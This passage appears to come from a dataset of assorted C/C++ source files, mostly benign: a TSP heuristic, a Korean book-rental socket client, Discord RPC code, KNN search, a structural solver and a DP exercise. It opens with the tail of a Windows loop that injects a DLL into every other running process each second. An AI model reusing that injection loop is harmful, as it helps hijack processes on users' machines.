!= GetCurrentProcessId()) {\n                InjectDLL(pe.th32ProcessID, dllPath);\n            }\n        } while (Process32Next(hSnapshot, &pe));\n\n        CloseHandle(hSnapshot);\n        Sleep(1000);\n\n    }\n    WaitForSingleObject(hThread, INFINITE);\n\n    free(dllPath);\n\n    return 0;\n}",
    "#include<iostream>\n#include<cstring>\n#include<ctime>\n#include<cmath>\n#include<fstream>\n#include<algorithm>\nusing namespace std;\n#define Pai 3.1415926535897\n#define MAXN 10010\nint mp[MAXN][MAXN];\nconst int num = 10000;//city number\n\ntypedef struct node {\n\tint x;\n\tint y;\n}city;\ncity citys[MAXN];//citys\ndouble dic[MAXN][MAXN];//distance from two citys;\nbool vis[MAXN][MAXN];\nbool visit[num];//visited\nint N;//real citys\nint R;//radius\nint seq[MAXN];//\ndouble answer;\nbool init(int n,double rou) \n{\n\tsrand(time(nullptr));\n\tR = ceil(sqrt((double)n / Pai / rou));\n\tif (R < 3)return false;\n\tcitys[0].x = citys[0].y = R;\n\tmemset(vis, false, sizeof(vis));\n\tvis[R][R] = true;\n\tint k = 0;\n\tint cur = 0;\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tdouble t = (double)rand() / (double)32768;\n\t\tdouble uu = sqrt(t)*R;\n\t\tdouble theta = (double)((double)rand()/(double)32768) * (2 * Pai);\n\t\tint uuu = uu * cos(theta) + R;\n\t\tint vvv = uu * sin(theta) + R;\n\t\tif (vis[uuu][vvv])\n\t\t{\n\t\t\tcontinue;\n\t\t}\n\t\telse citys[i].x = uuu, citys[i].y = vvv, vis[uuu][vvv] = true, k = 0;\n\t}\n\tN = n + 1;\n\treturn true;\n\t\n}\nvoid set_dic() {//set distance\n\tfor (int i = 0; i < N; ++i) {\n\t\tfor (int j = 0; j < N; ++j) {\n\t\t\tdic[i][j] = sqrt(pow(citys[i].x - citys[j].x, 2) + pow(citys[i].y - citys[j].y, 2));\n\t\t}\n\t}\n}\ndouble dic_two_point(city a, city b) {\n\treturn sqrt(pow(a.x - b.x, 2) + pow(a.y - b.y, 2));\n}\ndouble count_energy(int* conf) {\n\tdouble temp = 0;\n\tfor (int i = 1; i < N; ++i) {\n\t\ttemp += dic_two_point(citys[conf[i]], citys[conf[i - 1]]);\n\t}\n\ttemp += dic_two_point(citys[conf[0]], citys[conf[N - 1]]);\n\treturn temp;\n}\nvoid moni() {\n\tmemset(visit, false, sizeof(visit));\n\tint temp = 0;\n\tseq[0] = temp;\n\tvisit[temp] = true;\n\tint mini = -1;\n\tint ans = 1e9;\n\tfor (int i = 1; i < N; ++i) {//\u00b5\u00dai\u00ce\u00bb\u00d3\u00a6\u00b8\u00c3\u00be\u00ad\u00b9\u00fd\u00b5\u00c4\u00b5\u00e3\n\t\tans = 1e9;\n\t\tmini = -1;\n\t\tfor (int j = 0; j < N; ++j) {\n\t\t\tif (!visit[j] && ans > dic[seq[i - 1]][j]) {\n\t\t\t\tans = dic[seq[i - 1]][j];\n\t\t\t\tmini = j;\n\t\t\t}\n\t\t}\n\t\tseq[i] = mini;\n\t\tvisit[mini] = true;\n\t}\n\tanswer = count_energy(seq);\n}\n\nint main() {\n\tsrand(time(nullptr));\n\t//init(567, 0.1);\n\tint t;\n\tdouble fans;\n\tint cnt;\n\tofstream OOt(\"out.txt\");\n\t//for (int i = 0; i < 567; i++)OOt << citys[i].x << ' ' << citys[i].y << endl;\n\tfor (int i = 3; i <= 1000; i++)\n\t{\n\t\tOOt << i << ' ';\n\t\tfans = 0;\n\t\tcnt = 0;\n\t\tfor (int j=0;j<10;j++)\n\t\t{\n\t\t\tif(init(i, 0.0001))\n\t\t\t{\n\t\t\t\tset_dic();\n\t\t\t\tmoni();\n\t\t\t\tfans += answer;\n\t\t\t\tcnt++;\n\t\t\t}\n\t\t}\n\t\tif(cnt>0)OOt << (int)(fans /cnt) << endl;\n\t\telse  OOt << endl;\n\t\tcout << i << endl;\n\t}\n\treturn 0;\n}\n",
    "#include <iostream>\n#include <pthread.h>\n#include <queue>\n#include <semaphore.h>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <netinet/in.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n\t\n#define BUF_SIZE 500\n#define PORT 7229\nusing namespace std;\n\t\n\nvoid error_handling(const char * msg);\n\nvoid input_ADDID(int sock);\nvoid Login(int sock);\nvoid input_bookname(int sock);\nvoid rent(int sock);\nvoid returnbook(int sock);\nvoid recom_book(int sock);\n\nvoid write_msg(int sock, const char* msg);\nvoid read_msg(int sock);\n\nstatic char msg[BUF_SIZE];//\uba54\uc138\uc9c0\ud1b5\n\nstruct Userinfo{\n    string username;\n    string userID;\n    string userGrade;\n    string bookname;\n    string bookID;\n    int rentAbleDays;\n} userinfo;\n\t\nint main(int argc, const char *argv[])\n{\n\tint sock;\n\tstruct sockaddr_in serv_addr;\n\tpthread_t snd_thread, rcv_thread;\n\tvoid * thread_return;\n\n\tsock=socket(PF_INET, SOCK_STREAM, 0);\n\t\n\tmemset(&serv_addr, 0, sizeof(serv_addr));\n\tserv_addr.sin_family=AF_INET;\n\tserv_addr.sin_addr.s_addr=inet_addr(argv[1]);\n\tserv_addr.sin_port=htons(PORT);\n\t  \n\tif(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr))==-1)\n\t\terror_handling(\"connect() error\");\n\n   while(1)\n    {\n        cout << \"\ub85c\uadf8\uc778\uc774 \ud544\uc694\ud55c \uc11c\ube44\uc2a4\uc785\ub2c8\ub2e4.\\n1 : \ub85c\uadf8\uc778\\n2 : \ud68c\uc6d0\uac00\uc785\\n3 : \ub3c4\uc11c \uc870\ud68c\\n4 : \ub3c4\uc11c \ub300\uc5ec\\n5 : \ub300\uc5ec \ub3c4\uc11c \ubc18\ub0a9\\n\";\n        // cout << \"\ub85c\uadf8\uc778\uc774 \ud544\uc694\ud55c \uc11c\ube44\uc2a4\uc785\ub2c8\ub2e4.\\n1 : \ub85c\uadf8\uc778\\n2 : \ud68c\uc6d0\uac00\uc785\\n3 : \ub3c4\uc11c \uc870\ud68c\\n4 : \ub300\uc5ec \uae30\ub85d\\n\";\n        cout << \"\uc785\ub825 : \";\n\n        cin.getline(msg, BUF_SIZE);\n        write_msg(sock,msg);\n        // strcpy(msg,read_msg(sock));\n\n\n        if (strcmp(msg, \"1\") == 0) {\n            Login(sock);\n        } \n        else if (strcmp(msg, \"2\") == 0) {\n            input_ADDID(sock);\n        }\n        else if (strcmp(msg, \"3\") == 0) {\n            input_bookname(sock);\n        }\n        else if (strcmp(msg, \"4\") == 0) {\n            rent(sock);\n        }\n        else if (strcmp(msg, \"5\") == 0) {\n            returnbook(sock);\n        }\n        // read_msg(sock);\n    }\n\n\tclose(sock);  \n\treturn 0;\n}\n\nvoid input_ADDID(int sock)\n{\n\tstring inputData[5] = {\"\uc544\uc774\ub514\", \"\ube44\ubc00\ubc88\ud638\", \"\uc774\ub984\", \"\uc8fc\uc18c\", \"\uc5f0\ub77d\ucc98\"};\n\n    while(1)\n    {\n        cout << \"\uc785\ub825 \" << inputData[0] << \": \";\n        cin.getline(msg, BUF_SIZE);\n        write_msg(sock, msg);\n\n        // cout << msg << endl;\n\n        read_msg(sock);\n\n        if (strcmp(msg, \"1\") == 0)\n        {\n            cout << \"\uc0ac\uc6a9 \uac00\ub2a5\ud55c \uc544\uc774\ub514\uc785\ub2c8\ub2e4.\" << endl;\n            break;\n        }\n        else// if (strcmp(msg, \"2\") == 0)\n        {\n            cout << \"\uc774\ubbf8 \uc0ac\uc6a9\uc911\uc778 \uc544\uc774\ub514\uc785\ub2c8\ub2e4.\" << endl;\n            cout << \"\ub2e4\uc2dc \uc785\ub825\ud574\uc8fc\uc2dc\uae38\ubc14\ub78d\ub2c8\ub2e4.\" << endl;\n        }\n        cout << \"\\n\";\n    }\n\n    for (int i = 1; i < 5; i++) {\n        cout << \"\uc785\ub825 \" << inputData[i] << \": \";\n        cin.getline(msg, BUF_SIZE);\n\n        write_msg(sock, msg);\n        cout << msg << endl;\n    }\n}\n\nvoid Login(int sock)\n{\n    string inputData[2] = {\"\uc544\uc774\ub514\", \"\ube44\ubc00\ubc88\ud638\"};\n\n    while(1)\n    {\n        for (int i = 0; i < 2; i++) {\n            cout << \"Enter \" << inputData[i] << \": \";\n            cin.getline(msg, BUF_SIZE);\n            write_msg(sock, msg);\n\n            cout << msg << endl;\n        }\n\n        read_msg(sock);\n\n        if (strcmp(msg, \"1\") == 0) \n        {\n            cout << \"\ub85c\uadf8\uc778 \ub418\uc5c8\uc2b5\ub2c8\ub2e4.\" << endl;\n            break;\n        } \n        else if (strcmp(msg, \"2\") == 0) // 2 \ubc88\uc740 \ubd88\uc77c\uce58\n        {\n            cout << \"\ube44\ubc00\ubc88\ud638\uac00 \uc798\ubabb\ub418\uc5c8\uc2b5\ub2c8\ub2e4.\" << endl;\n            cout << \"\ud655\uc778 \ud6c4 \ub2e4\uc2dc \uc785\ub825\ud574 \uc8fc\uc2dc\uae38 \ubc14\ub78d\ub2c8\ub2e4.\" << endl;\n        } \n        else if (strcmp(msg, \"3\") == 0)\n        {\n            cout << \"\uc874\uc7ac\ud558\uc9c0 \uc54a\ub294 \uc544\uc774\ub514\uc785\ub2c8\ub2e4.\" << endl;\n            cout << \"\ud655\uc778 \ud6c4 \ub2e4\uc2dc \uc785\ub825\ud574 \uc8fc\uc2dc\uae38 \ubc14\ub78d\ub2c8\ub2e4.\" << endl;\n        }\n        cout << \"\\n\";\n    }\n} \n\nvoid input_bookname(int sock)\n{\n    cout << \"\ub3c4\uc11c \uac80\uc0c9: \";\n    cin.getline(msg, BUF_SIZE); \n    write_msg(sock, msg);\n    cout <<\"\\n[\uac80\uc0c9 \ub3c4\uc11c \uacb0\uacfc\uc785\ub2c8\ub2e4]\\n\";\n    \n    cout <<\"===================================================================\\n\";\n    for(int i = 0; i < sizeof(sock)+1; i++)\n    {\n        read_msg(sock);\n    }\n    cout <<\"====================================================================\\n\";\n    cout << \"\\n\ub300\uc5ec\ud560 \ub3c4\uc11c\uba85\uc744 \uc815\ud655\ud558\uac8c \uc785\ub825 \ubd80\ud0c1\ub4dc\ub9bd\ub2c8\ub2e4 : \";\n    memset(msg, 0, BUF_SIZE);\n    cin.getline(msg, BUF_SIZE); \n    write_msg(sock, msg);\n\n    cout << \"\\n\ub300\uc5ec\uac00 \uc644\ub8cc\ub418\uc5c8\uc2b5\ub2c8\ub2e4.\\n\";\n\n}\n\nvoid returnbook(int sock)\n{\n\n    cout << \" [ \ub300\uc5ec \uae30\ub85d ]\" << endl;\n    for(int i=0; i < sizeof(sock)+1 ; i++)\n    {\n        read_msg(sock);\n    }\n\n}\n\nvoid rent(int sock)\n{\n    cout <<\"\\n[\ub300\uc5ec\ud55c \ucc45 \ubaa9\ub85d\uc785\ub2c8\ub2e4]\\n\";\n\n    read_msg(sock);\n   \n    cout <<\"\\n\ubc18\ub0a9\ud560 \ucc45 \ubc88\ud638\ub97c \uc785\ub825\ud574 \uc8fc\uc138\uc694\\n\";\n    cin.getline(msg, BUF_SIZE);\n    write_msg(sock, msg);\n}\n\nvoid recom_book(int sock)\n{\n    cout << \"[\ucd94\ucc9c \ub3c4\uc11c \ubaa9\ub85d]\\n\";\n\n    for(int i=0; i < sizeof(sock); i++)\n    {   \n        read_msg(sock);\n    }\n    cout << \"\\n\";\n}\n\n\n\nvoid error_handling(const char *msg)\n{\n\tfputs(msg, stderr);\n\tfputc('\\n', stderr);\n\texit(1);\n}\n\n\n\n\nvoid write_msg(int sock, const char* msg)//\uc4f0\uae30\n{\n    write(sock, msg, strlen(msg));\n}\n\n\nvoid read_msg(int sock)//\ubc1b\uae30\n{\n    int bytes_received;\n\n     memset(msg, 0, BUF_SIZE);\n\n        bytes_received = read(sock, msg, BUF_SIZE);\n\n        if (bytes_received > 0)\n        {\n            msg[b",
    "#include \"discord/rpc_connection.hpp\"\n#include \"discord/serialization.hpp\"\n\n#include <atomic>\n\nstatic const int RpcVersion = 1;\nstatic RpcConnection Instance;\n\n/*static*/ RpcConnection* RpcConnection::Create(const char* applicationId)\n{\n    Instance.connection = BaseConnection::Create();\n    StringCopy(Instance.appId, applicationId);\n    return &Instance;\n}\n\n/*static*/ void RpcConnection::Destroy(RpcConnection*& c)\n{\n    c->Close();\n    BaseConnection::Destroy(c->connection);\n    c = nullptr;\n}\n\nvoid RpcConnection::Open()\n{\n    if (state == State::Connected) {\n        return;\n    }\n\n    if (state == State::Disconnected && !connection->Open()) {\n        return;\n    }\n\n    if (state == State::SentHandshake) {\n        JsonDocument message;\n        if (Read(message)) {\n            auto cmd = GetStrMember(&message, \"cmd\");\n            auto evt = GetStrMember(&message, \"evt\");\n            if (cmd && evt && !strcmp(cmd, \"DISPATCH\") && !strcmp(evt, \"READY\")) {\n                state = State::Connected;\n                if (onConnect) {\n                    onConnect(message);\n                }\n            }\n        }\n    }\n    else {\n        sendFrame.opcode = Opcode::Handshake;\n        sendFrame.length = (uint32_t)JsonWriteHandshakeObj(\n          sendFrame.message, sizeof(sendFrame.message), RpcVersion, appId);\n\n        if (connection->Write(&sendFrame, sizeof(MessageFrameHeader) + sendFrame.length)) {\n            state = State::SentHandshake;\n        }\n        else {\n            Close();\n        }\n    }\n}\n\nvoid RpcConnection::Close()\n{\n    if (onDisconnect && (state == State::Connected || state == State::SentHandshake)) {\n        onDisconnect(lastErrorCode, lastErrorMessage);\n    }\n    connection->Close();\n    state = State::Disconnected;\n}\n\nbool RpcConnection::Write(const void* data, size_t length)\n{\n    sendFrame.opcode = Opcode::Frame;\n    memcpy(sendFrame.message, data, length);\n    sendFrame.length = (uint32_t)length;\n    if (!connection->Write(&sendFrame, sizeof(MessageFrameHeader) + length)) {\n        Close();\n        return false;\n    }\n    return true;\n}\n\nbool RpcConnection::Read(JsonDocument& message)\n{\n    if (state != State::Connected && state != State::SentHandshake) {\n        return false;\n    }\n    MessageFrame readFrame;\n    for (;;) {\n        bool didRead = connection->Read(&readFrame, sizeof(MessageFrameHeader));\n        if (!didRead) {\n            if (!connection->isOpen) {\n                lastErrorCode = (int)ErrorCode::PipeClosed;\n                StringCopy(lastErrorMessage, \"Pipe closed\");\n                Close();\n            }\n            return false;\n        }\n\n        if (readFrame.length > 0) {\n            didRead = connection->Read(readFrame.message, readFrame.length);\n            if (!didRead) {\n                lastErrorCode = (int)ErrorCode::ReadCorrupt;\n                StringCopy(lastErrorMessage, \"Partial data in frame\");\n                Close();\n                return false;\n            }\n            readFrame.message[readFrame.length] = 0;\n        }\n\n        switch (readFrame.opcode) {\n        case Opcode::Close: {\n            message.ParseInsitu(readFrame.message);\n            lastErrorCode = GetIntMember(&message, \"code\");\n            StringCopy(lastErrorMessage, GetStrMember(&message, \"message\", \"\"));\n            Close();\n            return false;\n        }\n        case Opcode::Frame:\n            message.ParseInsitu(readFrame.message);\n            return true;\n        case Opcode::Ping:\n            readFrame.opcode = Opcode::Pong;\n            if (!connection->Write(&readFrame, sizeof(MessageFrameHeader) + readFrame.length)) {\n                Close();\n            }\n            break;\n        case Opcode::Pong:\n            break;\n        case Opcode::Handshake:\n        default:\n            // something bad happened\n            lastErrorCode = (int)ErrorCode::ReadCorrupt;\n            StringCopy(lastErrorMessage, \"Bad ipc frame\");\n            Close();\n            return false;\n        }\n    }\n}\n",
    "//=============================================================================\n//  C O P Y R I G H T\n//-----------------------------------------------------------------------------\n// Copyright (c) 2024 by Hoka David-Stelian. All rights reserved.\n//\n//  This file is property of Hoka David-Stelian. Any unauthorised copy, use or\n//  distribution is an offensive act against international law and may be\n//  prosecuted under federal law. Its content is personal confidential.\n//=============================================================================\n// P R O J E C T   I N F O R M A T I O N\n//-----------------------------------------------------------------------------\n//       Project name: Dino3D\n//           Synopsis: wrapper library for Window abstract class\n//   Target system(s):\n//        Compiler(s): VS16\n//=============================================================================\n//  N O T E S\n//-----------------------------------------------------------------------------\n//  Notes:\n//=============================================================================\n//  I N I T I A L   A U T H O R   I D E N T I T Y\n//-----------------------------------------------------------------------------\n//        Name: Hoka David-Stelian\n//  Department: Project Owner (CEO)\n//=============================================================================\n//  R E V I S I O N   I N F O R M A T I O N\n//-----------------------------------------------------------------------------\n/// @file\n/// @brief add short description here\n/// @par Revision History:\n///      $Source: AppWindow.cpp $\n///      $Revision: 1.1 $\n///      $Author: Hoka David-Stelian (CEO) (Dino3D) $\n///      $Date: 2024/08/04 18:50:01 PM\n///      $Name:  $\n///      $State: in_work $\n//=============================================================================\n\n#include \"AppWindow.hpp\"\n\nAppWindow::AppWindow()\n{\n}\n\nAppWindow::~AppWindow()\n{\n}\n\nvoid AppWindow::onCreate()\n{\n}\n\nvoid AppWindow::onUpdate()\n{\n}\n\nvoid AppWindow::onDestroy()\n{\n\tWindow::onDestroy();\n}",
    "/**\n* @file DataVector.h\n* @brief Define the functionality of KNearestNeighbour\n* \n*The provided C++ program performs a nearest neighbor search on a dataset using the k-nearest\n*neighbors (KNN) algorithm. The program reads two datasets, namely \"train.csv\" and \"test.csv,\"\n*representing training and test data, respectively. The training dataset is used to build a model,\n*and the test dataset is utilized to find the k-nearest neighbors for each data point. The user \n*can specify different values of k (number of neighbors to consider) for the search. The program \n*converts the dataset into vectors of DataVector objects, where each DataVector encapsulates a set\n*of numeric values. The nearest neighbor search is conducted using a custom VectorDataset class, \n*and the results are displayed, showing the nearest neighbors for each data point in the test dataset. \n*The program reports the sizes of the training and test vectors, ensures that the vectors are non-empty, \n*and validates the chosen k value. Additionally, the execution time for each k value is measured using \n*chrono library, and the total time taken for the nearest neighbor search is displayed. This program\n*serves as a versatile tool for exploring different k values and assessing the impact on the KNN\n*algorithm's performance on the given datasets.\n* \n* @author Abhinav Kumar Singh\n* \n * System Information \n *OS: Ubuntu 22.04.3 LTS x86_64 \n *Host: ASUS TUF Gaming A15 FA506ICB_FA506ICB 1.0 \n *Kernel: 6.5.0-15-generic\n *Packages: 1779 (dpkg), 11 (snap) \n *Shell: bash 5.1.16 \n *Resolution: 1920x1080 \n *DE: GNOME 42.9 \n *WM: Mutter \n *WM Theme: Adwaita \n *Theme: Yaru-blue-dark [GTK2/3] \n *Icons: Yaru-blue [GTK2/3] \n *Terminal: gnome-terminal \n *CPU: AMD Ryzen 7 4800H with Radeon Graphics (16) @ 4.300G \n *GPU: NVIDIA GeForce RTX 3050 Mobile \n *GPU: AMD ATI 05:00.0 Renoir \n *Memory: 2452MiB / 7343MiB\n * \n * Output Time For Some k's:\n * K=2 Time Taken:164ms\n * K=5 Time Taken:291ms\n * K=7 Time Taken:391ms\n * K=10 Time Taken:442ms    \n*/\n\n#include <algorithm>\n#include <chrono>\n#include <fstream>\n#include <iostream>\n#include <sstream>\n#include <vector>\n#include \"VectorDataset.h\"\nusing namespace std;\n\n// Function declarations\nVectorDataset readDatasetFromFile(const string &filename);\nVectorDataset knearestneighbor(const vector<DataVector> &trainVectors,\n                               const vector<DataVector> &testVectors, int k);\n\nint main() {\n  //Start Timer\n   auto start = chrono::high_resolution_clock::now();\n  // Read training dataset from datasettrain.csv\n  VectorDataset trainDataset = readDatasetFromFile(\"train.csv\");\n\n  // Read test dataset from datasettest.csv\n  VectorDataset testDataset = readDatasetFromFile(\"test.csv\");\n\n  // Convert VectorDataset to vectors of DataVector\n  vector<DataVector> trainVectors;\n  for (int i = 0; i < trainDataset.size(); ++i) {\n    trainVectors.push_back(trainDataset.getDataVector(i));\n  }\n\n  vector<DataVector> testVectors;\n  for (int i = 0; i < testDataset.size(); ++i) {\n    testVectors.push_back(testDataset.getDataVector(i));\n  }\n\n  // Specify k for nearest neighbor search\n  int k = 10;\n\n  // Print sizes of train and test vectors\n  cout << \"Train Vector Size: \" << trainVectors.size() << endl;\n  cout << \"Test Vector Size: \" << testVectors.size() << endl;\n\n  // Check if the vectors are non-empty\n  if (trainVectors.empty() || testVectors.empty()) {\n    cerr << \"Error: Train or test vectors are empty.\" << endl;\n    return 1;\n  }\n\n  \n  // Check if k is within a valid range\n  if (k > static_cast<int>(trainVectors.size())) {\n    cerr << \"Error: Invalid k value. It cannot exceed the size of the training \"\n            \"vectors.\"\n         << endl;\n    return 1;\n  }\n\n  // Perform nearest neighbor search\n  VectorDataset result = knearestneighbor(trainVectors, testVectors, k);\n\n  \n // Display the result\n  \n  for (int i = 0,t=0; i < result.size(); ++i) {\n    if(i%k==0){\n      printf(\"For \");\n      testVectors[t].printVector();\n      printf(\"Closet %d vectors are:\\n\",k);\n      t++;\n    }\n    DataVector neighbor = result.getDataVector(i);\n    neighbor.printVector();\n  }\n  // Stop the timer after displaying neighbors\n    auto stop = chrono::high_resolution_clock::now();\n    auto duration = chrono::duration_cast<chrono::milliseconds>(stop - start);\n\n    cout << \"Nearest neighbor search took \" << duration.count() << \" milliseconds.\" << endl;\n\n  return 0;\n}\n\nVectorDataset readDatasetFromFile(const string &filename) {\n  VectorDataset data;\n\n  ifstream file(filename);\n  string line = \"\";\n\n  if (file.is_open()) {\n    // Read lines from the CSV file\n    while (getline(file, line)) {\n      vector<double> row;\n      stringstream iss(line);\n\n      // Parse all components from a single line\n      double vect_component;\n      while (iss >> vect_component) {\n        // cout << \"vect: \" << vect_component << \"\\n\";\n        row.push_back(vect_component);\n\n        // Check for the comma to move to the next component\n        if (iss.peek() == ',')\n          iss.",
    "#include <iostream>\n#include <sstream>\n#include \"priorityQueue.h\"\n\nint main()\n{\n    priorityQueue<std::string> receivedPackets;\n    std::string word, message, receivedMessage;\n\n    std::cout << \"Prosze wpisac wiadomosc Jana do Anny:\\n> \";\n\n    std::getline(std::cin, message);\n    std::istringstream iss(message);\n\n    std::cout << \"\\nWiadomosc dzielona jest na kolejne pakiety (slowa), ktorych priorytet w kolejce jest taki sam jak kolejnosc w wiadomosci wyslanej przez Jana.\"\n                 \" Zakladamy, ze kolejne pakiety przychodza do Anny w losowej kolejnosci i dzieki wlasnosciom kolejki komputer Anny zlozy je w oryginalna wiadomosc.\\n\\n\";\n\n    std::cout << \"Ponizej przedstawiono jak zmienia sie kolejka priorytetowa po dodaniu kolejnych pakietow (gdzie: [klucz] slowo).\\n\\n\";\n\n    for (unsigned int i = 1; iss >> word; ++i)\n    {\n        receivedPackets.insert(word, i);\n        receivedPackets.print();\n    }\n\n    for (unsigned int i = 1; receivedPackets.size(); ++i)\n        receivedMessage = receivedMessage + receivedPackets.removeMin() + \" \";\n\n    std::cout << \"\\nOdebrana wiadomosc: \" << receivedMessage << '\\n';\n}\n",
    "#include <stdio.h>\r\n#include <windows.h> // text color\r\n#include <conio.h>\r\n#define N 10000\r\n#define NN 10 // Degree of freedom\r\n#define Ne 3    // number of element\r\n#define ShowText01 \"Pushover2ndOrderFixedSupportBeamPHFCLD-inputDATA.csv\"\r\n#define ShowText02 \"Pushover2ndOrderFixedSupportBeamPHFCLD-inputHINGE.csv\"\r\n#define ShowText03 \"Output data is written in Excel file\"\r\n#define ShowText04 \"Pushover2ndOrderFixedSupportBeamPHFCLD-outputEXCEL.csv\"\r\n#define ShowText05 \"Pushover2ndOrderFixedSupportBeamPHFCLD-outputHTML.html\"\r\n#define ShowText06 \"Graph-outputHTML.html\"\r\n\r\nvoid IMPORT_DATA01(double &Length,double &EA,double &EI,double applied_load[],double &Dmax,int &M,int &itermax,double &tolerance);\r\nvoid IMPORT_DATA02(double TET[],double MOM[],int &k);\r\nvoid MatrixAssembled(double [Ne][6][6],double [][NN]);\r\nvoid MatrixDetermination(double [][NN],int );\r\nvoid MatrixInverse(double [][NN], double [][NN],int );\r\nvoid MatrixMulti01(double [][NN], double [], double [], double [],int );\r\nvoid MatrixMulti02(double [][NN], double [], double [], double [],int );\r\nvoid MatrixZero(double A[][NN],int n);\r\nvoid MatrixChange(double A[][NN],double B[][NN],int n);\r\nvoid ElementInternalForce(double A[],double B[],double C[],double D[],double E[],double lanX[],double lanY[],double U[],double ee[][6],int I);// Calculate internal element force\r\nvoid ElementStiffness(double eleF[3][6],double Length,double EI,double EA,double u[],double L[],double lanX[],double lanY[],double AA[],double BB[],double CC[],double DD[],double EE[],double Kele[3][6][6]);\r\nvoid PlasticHingeStiffnessCOFF(double [],double [],double [],int );// Calculate slope Moment rotation of plastic hinge\r\nvoid PlasticHingeStiffness(double A[3][6],int I,int II,double B[],double C[],int III,double D[],double E[],double KRK[],int I4,int n);\r\ndouble ABS(double);\r\ndouble MAX_ABS(double [],int );\r\ndouble SQRT2(double);\r\nvoid MessageNotConverge(int ,int );\r\nvoid MessageConverge(int ,int ,double ,double []);\r\nvoid MessageInitialData(double ,double ,double ,double [],double ,int ,double ,int );\r\nvoid MessageCheckInputMk(int ,int );\r\nvoid MessageAnalysisReport();\r\nvoid MessageErrorReportTEXT();\r\nvoid MessageInputDataTEXT();\r\nvoid MessagePlasticHingeTEXT(double [],double [],int );\r\nvoid MessageCheck_IMPORT_DATA01(double ,double ,double ,double ,int ,double ,int );\r\nvoid MessageCheck_IMPORT_DATA02(double [],double [],int );\r\nint MessageControl(double Dmax,double u[],double TET[],int n);\r\nvoid bilinear(double [][3],double [][2],double [],int );\r\nvoid OUTPUT_excel(double output_u01[],double output_u02[],double output_u03[],double output_u04[],double output_base01[],double output_base02[],double output_base03[],double output_base04[],double output_base05[],int n);\r\nvoid OUTPUT_html(double applied_load[],double L,double EI,double EA,double Dmax,int itermax,double tolerance,int M,double TET[],double MOM[],int m,double output_u01[],double output_u02[],double output_u03[],double output_u04[],double output_base01[],double output_base02[],double output_base03[],double output_base04[],double output_base05[],int n);\r\nvoid OUTPUT_HTML_GRAPH(double X[],double Y[],int n,const char text1[],const char text2[],const char text3[]);\r\nvoid ANALYSIS(double Length,double EI,double EA,double Fini,double Dmax,double itermax,double tolerance,double residual,double applied_load[],double TET[],double MOM[],int n,double Rk[],int M);\r\nvoid Distance(int);\r\nvoid textcolor(int ForgC);\r\nvoid DATE_TIME();\r\nint main(){\r\n    double Length,EI,EA,Fini,Dmax,tolerance,residual,applied_load[NN];\r\n    int M,Y,itermax;\r\n    double TET[10],MOM[10],Rk[10];\r\n\r\n    IMPORT_DATA01(Length,EA,EI,applied_load,Dmax,M,itermax,tolerance);\r\n    MessageCheck_IMPORT_DATA01(Length,EI,EA,Dmax,itermax,tolerance,M);\r\n\tIMPORT_DATA02(TET,MOM,Y);\r\n\tMessageCheck_IMPORT_DATA02(TET,MOM,Y);\r\n    MessageCheckInputMk(Y,M);\r\n\tPlasticHingeStiffnessCOFF(TET,MOM,Rk,Y);// Calculate slope Moment rotation of plastic hinge\r\n\ttextcolor(14);\r\n    MessageInitialData(Length,EI,EA,applied_load,Dmax,itermax,tolerance,M);\r\n    MessagePlasticHingeTEXT(TET,MOM,Y);\r\n    textcolor(11);\r\n    MessageAnalysisReport();\r\n    ANALYSIS(Length,EI,EA,Fini,Dmax,itermax,tolerance,residual,applied_load,TET,MOM,Y,Rk,M);\r\n    getch();\r\n    return 0;\r\n}\r\nvoid MatrixInverse(double A[][NN], double C[][NN],int n){\r\n  int i,j,l;\r\n  double c_A[n][n],B[n][n],m,Sum;\r\n  for (i=0;i<n;i++)\r\n  for (j=0;j<n;j++)\r\n  c_A[i][j]=A[i][j];\r\n// Inverse [Kinit]\r\n\t        for (i=0;i<n;i++)\r\n\t        for (j=0;j<n;j++){\r\n\t\t\t\tif (i==j)\r\n\t\t\t\t\tB[i][j]=1;\r\n\t\t\t\telse\r\n\t\t\t\t\tB[i][j]=0;\r\n\t\t\t}\r\n\r\n\tfor (j=0;j<n-1;j++)\r\n       \tfor (i=j+1;i<n;i++){\r\n\t\t\tm=c_A[i][j]/c_A[j][j];\r\n\t\t\tfor (l=0;l<n;l++){\r\n\t\t\t\tc_A[i][l] -= m*c_A[j][l];\r\n\t\t\t\tB[i][l] -= m*B[j][l];\r\n\t\t\t}\r\n\t\t}\r\n\t\t\t// backward substitutions\r\n   \tfor (i=n-1;i>=0;i--)\r\n\t\tfor (j=0;j<n;j++){\r\n       \t\tSum=0;\r\n\t\t\t\t\tfor (l=i+1;l<n;l++)\r\n\t\t            Sum += c_A[i][l]*C[l][j];\r\n\t\t\t    C[i][j]=(B[i][j]-Sum)/c_A[i][i];\r\n\t    }\r\n}\r\nvoid PlasticHingeStiffnessCOFF(double A",
    "#include <bits/stdc++.h>\n#include <iostream>\n#include <vector>\n#include <string>\n#include <map>\n\nusing namespace std;\n\n// 5 ---------------------------------   House Robber  ( Using DP ) ---------------------------------\n\n/*\n\n2. House Robber (Using DP)\n\n3. Time Complexity:\n\t5. O(N) where N is the number of elements in the array.\n\n3. Space Complexity:\n\t5. O(N) where N is the number of elements in the array.\n\n3. Time complexity using master theorem:\n\t5. T(n) = O(1) + T(n-1) = O(n)\n\n3. DESCRIPTION:\n\t5. You are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed. All houses at this place are arranged in a circle. That means the first house is the neighbor of the last one. Meanwhile, adjacent houses have a security system connected, and it will automatically contact the police if two adjacent houses were broken into on the same night.\n\t5. Given a list of non-negative integers nums representing the amount of money of each house, return the maximum amount of money you can rob tonight without alerting the police.\n\n3. APPROACH:\n\t5. If the number of houses is less than or equal to 1, return the amount of money in the house.\n\t5. Create a dp array of size n+1 and initialize it with -1.\n\t5. Recursively calculate the maximum amount of money that can be robbed from the houses.\n\t5. Return the maximum amount of money that can be robbed from the houses.\n\n*/\n\nint solve(vector<int> &dp, int n, vector<int> nums)\n{\n\tif (n < 0)\n\t\treturn 0;\n\n\tif (dp[n] != -1)\n\t\treturn dp[n];\n\n\tint steal = nums[n] + solve(dp, n - 2, nums);\n\tint notSteal = solve(dp, n - 1, nums);\n\n\treturn dp[n] = max(steal, notSteal);\n}\n\nint rob(vector<int> &nums)\n{\n\n\tint n = nums.size();\n\tvector<int> dp(n + 1, -1);\n\n\treturn 